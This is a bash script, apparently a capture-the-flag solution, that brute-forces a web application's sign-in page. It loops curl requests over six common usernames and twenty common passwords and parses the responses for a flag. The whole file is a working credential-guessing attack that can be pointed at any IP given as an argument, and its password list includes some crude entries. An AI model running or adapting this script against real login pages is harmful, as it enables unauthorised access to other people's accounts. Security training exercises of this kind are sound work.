#!/bin/bash
#
# ./get-the-brute-force-flag.sh "ip"
# connect by brute force unhashed login/password

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test pass all
	#		query string by url ($1)
	curl -sG --data-urlencode "${2}" "${1}" 
	return $?
}

table="Log by Brute Force"
echo -e "\n\033[35m1. === ${table} ===============================================\033[0m\n"
declare -a most_used_usernames=("root" "admin" "test" "guest" "info" "")
declare -a twenty_worst_used_passwords=("123456" "password" "12345678" "1234" "pussy" "12345" "dragon" "qwerty" "696969" "mustang" "letmein" "baseball" "master" "michael" "football" "shadow" "monkey" "abc123" "pass" "fuckme")

let "nb_usernames=${#most_used_usernames[@]}"
let "nb_passwords=${#twenty_worst_used_passwords[@]}"

echo -e "\nWe are going to try to brute force for logging as an authenticated user with the ${nb_usernames} most/worst used usernames: \033[33m${most_used_usernames[@]}\033[0m and the ${nb_passwords} most/worst used passwords: \033[35m${twenty_worst_used_passwords[@]}\033[0m\n"
color_result_brute_force="\033[31m"
let "pos=0"
for (( i=0; i<${nb_usernames}; i++ ))
do
	for (( j=0; j<${nb_passwords}; j++ ))
		do
			result_brute_force=`simplified_curl_request "${1}/index.php?page=signin&username=${most_used_usernames[${i}]}&Login=Login" "password=${twenty_worst_used_passwords[${j}]}"  |  grep -Eo "(The flag is : [^</>]*|WrongAnswer)" | awk -F: '{if ($0 ~ /WrongAnswer/) print $0; else print $NF;}'`
			if [[ "${result_brute_force}" =~ "WrongAnswer" ]]
			then
				color_result_brute_force="\033[31m"
			else
				color_result_brute_force="\033[32m"
			fi
			let "pos++"
			printf "%5.5d\tusername:\033[33m%-5.5s\033[0m\tpassword:\033[35m%-10.10s\033[0m\t${color_result_brute_force}%-${#result_brute_force}.${#result_brute_force}s\033[0m\n" "${pos}" "${most_used_usernames[${i}]}" "${twenty_worst_used_passwords[${j}]}" "${result_brute_force// /}"
		done
done
echo -e "\n\$\$\$ ${table} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
